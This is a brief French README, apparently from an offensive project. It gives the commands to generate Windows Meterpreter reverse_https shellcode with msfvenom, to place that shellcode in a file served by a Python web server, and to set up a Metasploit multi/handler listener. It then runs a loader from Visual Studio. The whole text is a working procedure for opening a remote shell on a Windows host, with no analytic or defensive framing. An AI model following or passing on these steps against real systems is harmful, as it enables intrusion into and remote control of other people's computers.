Sur kali executer la commande : msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT= <port> -f c >> meter.c

Dans le fichier PythonFiles:

Dans payloadClear.txt placer le shellcode obtenu dans meter.c
Executer le fichier PythonWebServer.py

Ensuite dans kali:
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost <ip>
set lport <port>
run

Sur Visual Studio lancer le code.
